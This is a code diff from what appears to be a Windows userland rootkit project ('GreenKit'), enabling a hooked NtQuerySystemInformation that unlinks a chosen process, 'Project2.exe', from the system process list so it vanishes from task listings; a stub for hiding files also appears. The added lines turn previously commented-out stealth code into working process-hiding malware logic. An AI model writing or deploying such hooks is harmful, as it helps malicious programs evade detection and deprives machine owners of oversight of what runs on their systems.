@@ -2,6 +2,7 @@
 #include "GreenKit.h"
 
 std::map<std::string, void*> m_OldFunctionsMap;
+const wchar_t* m_ProcessToHide = L"Project2.exe";
 
 BOOL mustHideFile(TCHAR filePath) {
     return FALSE; // TODO check la fin de la string avec des constantes
@@ -55,7 +56,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
         SystemInformation,
         SystemInformationLength,
         ReturnLength);
-    /*
+    
     if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
     {
         //
@@ -70,7 +71,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
             pCurrent = pNext;
             pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
 
-            if (!wcsncmp(pNext->ImageName.Buffer, L"calc.exe", pNext->ImageName.Length))
+            if (!wcsncmp(pNext->ImageName.Buffer, m_ProcessToHide, pNext->ImageName.Length))
             {
                 if (0 == pNext->NextEntryOffset)
                 {
@@ -84,8 +85,8 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
                 pNext = pCurrent;
             }
         } while (pCurrent->NextEntryOffset != 0);
-    }*/
-    return status + 5;
+    }
+    return status;
 }
 
 void *Hook(char *szDllName, char *szFunctionName, void *pNewFunction)
